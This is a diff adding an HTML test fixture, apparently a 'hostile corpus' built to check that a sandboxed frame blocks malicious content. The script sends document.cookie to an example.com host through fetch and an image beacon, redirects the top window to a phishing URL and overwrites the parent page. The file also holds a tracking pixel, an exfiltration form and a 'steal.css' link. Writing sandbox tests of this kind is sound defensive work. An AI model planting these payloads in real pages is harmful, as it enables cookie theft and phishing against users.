@@ -1,0 +1,23 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Quarterly report</title>
+  <base href="https://example.com/">
+  <link rel="stylesheet" href="https://example.com/steal.css">
+</head>
+<body>
+  <h1>Quarterly report</h1>
+  <p>Visible content a person should still see.</p>
+  <img src="https://example.com/pixel.gif?d=1" alt="tracking pixel">
+  <form action="https://example.com/collect" method="post"><input name="d" value="x"></form>
+  <script>
+    // FEAT-109 hostile corpus: every line below must fail inside the sandboxed frame.
+    try { fetch('https://example.com/?d=' + encodeURIComponent(document.cookie)); } catch (e) {}
+    try { localStorage.setItem('owned', '1'); } catch (e) {}
+    try { top.location = 'https://example.com/phish'; } catch (e) {}
+    try { parent.document.body.innerHTML = 'owned'; } catch (e) {}
+    try { new Image().src = 'https://example.com/?c=' + document.cookie; } catch (e) {}
+  </script>
+</body>
+</html>
